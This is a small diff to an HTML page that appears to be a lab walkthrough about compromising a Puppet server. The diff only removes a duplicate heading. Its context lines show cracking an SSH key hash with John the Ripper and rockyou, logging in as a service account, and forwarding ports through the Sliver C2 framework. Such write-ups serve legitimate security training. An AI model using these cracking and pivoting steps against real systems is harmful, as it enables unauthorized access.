@@ -212,9 +212,6 @@ john ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
     <h3>SSH Access to Puppet Server</h3>
     <pre><code># Direct SSH connection using the external IP (no internal IP required)
 ssh -i ed25519 -p 22 svc_puppet_lin_t1@puppet.vl@lab_IP</code></pre>
-
-    <h3>SSH Access to Puppet Server</h3>
-
     <pre><code># Set up port forwarding through Sliver
 portfwd add --bind 2222 -r <EXTERNAL_IP>:22
 
